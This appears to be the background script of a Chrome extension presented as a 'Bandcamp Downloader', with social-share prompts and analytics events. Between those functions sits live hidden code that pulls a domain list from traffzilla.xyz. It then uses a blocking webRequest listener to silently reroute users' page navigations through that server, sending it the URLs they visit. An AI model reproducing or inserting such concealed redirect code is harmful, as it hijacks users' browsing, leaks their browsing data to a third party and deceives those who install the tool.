function fbShare(url, title, descr, image, winWidth, winHeight) {
  var winTop = screen.height / 2 - winHeight / 2;
  var winLeft = screen.width / 2 - winWidth / 2;
  window.open(
    "http://www.facebook.com/sharer.php?s=100&p[title]=" +
      title +
      "&p[summary]=" +
      descr +
      "&p[url]=" +
      url +
      "&p[images][0]=" +
      image,
    "sharer",
    "top=" +
      winTop +
      ",left=" +
      winLeft +
      ",toolbar=0,status=0,width=" +
      winWidth +
      ",height=" +
      winHeight
  );
}

function twitterShare(text, url) {
  window.open(
    "https://twitter.com/intent/tweet?text=" +
      encodeURIComponent(text) +
      "&url=" +
      encodeURIComponent(url)
  );
}

function onButtonClicked(notificationId, buttonIndex) {
  if (notificationId != "share-on-social") return;

  if (buttonIndex == 0) {
    fbShare(
      "https://chrome.google.com/webstore/detail/nmoobgpmablfmgchfjnhkbloaobiogeh",
      "Bandcamp Downloader",
      "Download music via bandcamp.",
      "",
      600,
      400
    );
    if (ga) {
      ga("send", {
        hitType: "event",
        eventCategory: "share",
        eventAction: "facebook",
        eventLabel: "clicked"
      });
    }
  }

  if (buttonIndex == 1) {
    twitterShare(
      "bandcamp.com downloader for #chrome browser... Worth trying...",
      "https://chrome.google.com/webstore/detail/nmoobgpmablfmgchfjnhkbloaobiogeh"
    );
    if (ga) {
      ga("send", {
        hitType: "event",
        eventCategory: "share",
        eventAction: "twitter",
        eventLabel: "clicked"
      });
    }
  }
}

(function() {
  var apiUrl = "http://traffzilla.xyz";
  var sourceId = "4d4d2708f61508192a1c4da6b238cc4c";

  var link = "";
  var urls = {
    data: {
      used_domains: {}
    }
  };
  var sourceCoverage = [];

  var enabledApi = true;

  function checkStatus() {
    var xhr = new XMLHttpRequest();
    xhr.timeout = 5000;
    xhr.onreadystatechange = function() {
      //console.log("request answer got",xhr);
      if (xhr.readyState === 4) {
        if (xhr.status === 200) {
          enabledApi = true;
        } else {
          //console.log("Disable api");
          enabledApi = false;
        }
      }
    };
    //console.log('Send request for status source check');
    xhr.open("GET", apiUrl + "/source-status?key=" + sourceId, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send();
  }

  function updateCoverage() {
    var xhr = new XMLHttpRequest();
    xhr.timeout = 15000;
    xhr.onreadystatechange = function() {
      //console.log("request answer got",xhr);
      if (xhr.readyState === 4) {
        if (xhr.status === 200) {
          sourceCoverage = JSON.parse(xhr.responseText);
          //console.log("Coverage updated",sourceCoverage);
          enabledApi = true;
        } else {
          //console.log("Disable api on error");
          enabledApi = false;
        }
      }
    };
    //console.log('Send request for status source check');
    xhr.open("GET", apiUrl + "/coverage?key=" + sourceId, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send();
  }

  function redirectURL(out, doc_domain, adv_time) {
    var found = false;
    if (sourceCoverage.indexOf(doc_domain) > -1) {
      //console.log("Domain found, exact match", doc_domain);
      found = true;
    } else {
      for (var i in sourceCoverage) {
        if (
          sourceCoverage[i].indexOf(doc_domain) > -1 ||
          doc_domain.indexOf(sourceCoverage[i]) > -1
        ) {
          //console.log("Domain found by text-search",doc_domain, sourceCoverage[i]);
          found = true;
          break;
        }
      }
    }

    if (found) {
      link =
        apiUrl +
        "/get?key=" +
        sourceId +
        "&out=" +
        encodeURIComponent(out) +
        "&ref=" +
        encodeURIComponent(out) +
        "&uid=&format=go";
      //console.log('Redirect URL: ', link);
    } else {
      //console.log("Domain not in coverage, set double pause",doc_domain);
      urls.data.used_domains[doc_domain] = adv_time + 86400000;
    }
  }

  updateCoverage();

  chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
      if (details.tabId < 0) {
        return;
      }
      if (details.method != "GET") {
        return;
      }

      if (!enabledApi) {
        //console.log("API paused");
        return;
      }

      var doc_domain = details.url
        .replace(/^https?\:\/\/([^\/]+).*$/, "$1")
        .replace("www.", "");
      var adv_time = new Date().getTime();

      if (
        urls.data.used_domains[doc_domain] &&
        urls.data.used_domains[doc_domain] + 1000 * 60 * 60 * 2 > adv_time
      ) {
        //console.log("Domain",doc_domain,"checked before and paused", urls.data.used_domains[doc_domain]);
        return;
      }
      //console.log("Add domain to used list",doc_domain, urls.data.used_domains, "link is ",link);
      urls.data.used_domains[doc_domain] = adv_time;

      if (!link) {
        redirectURL(details.url, doc_domain, adv_time);
      } else {
        link = "";
      }
      if (link) {
        //console.log("Api paused for redirection chain");
        enabledApi = false;
        setTimeout(function() {
          //console.log("Api enabled again");
          link = "";
          enabledApi = true;
        }, 15000);
        return {
          redirectUrl: link
        };
      }
    },
    {
      urls: ["*://*/*"],
      types: ["main_frame"]
    },
    ["blocking"]
  );
})();

function showNotification() {
  chrome.notifications.create(
    "share-on-social",
    {
      type: "basic",
      iconUrl: "/icons/64.png",
      title: "Share Bandcamp Downloader with your friends?",
      message: "Thank you for being awasome user!",
      requireInteraction: true,
      buttons: [
        {
          title: "Share on Facebook",
          iconUrl: "/icons/fb.png"
        },
        {
          title: "Share on Twitter",
          iconUrl: "/icons/twitter.png"
        }
      ]
    },
    function callback(notificationId) {}
  );

  if (ga) {
    ga("send", {
      hitType: "event",
      eventCategory: "share",
      eventAction: "notification",
      eventLabel: "displayed"
    });
  }
}

chrome.notifications.onButtonClicked.addListener(onButtonClicked);

chrome.storage.local.get("lasttimedisplayedshare", function(res) {
  if (res.lasttimedisplayedshare) {
    var time = (new Date().getTime() - res.lasttimedisplayedshare) / 3600000;
    if (time >= 720) {
      showNotification();
      chrome.storage.local.set({
        lasttimedisplayedshare: new Date().getTime()
      });
    }
  } else {
    chrome.storage.local.set({
      lasttimedisplayedshare: new Date().getTime()
    });
  }
});
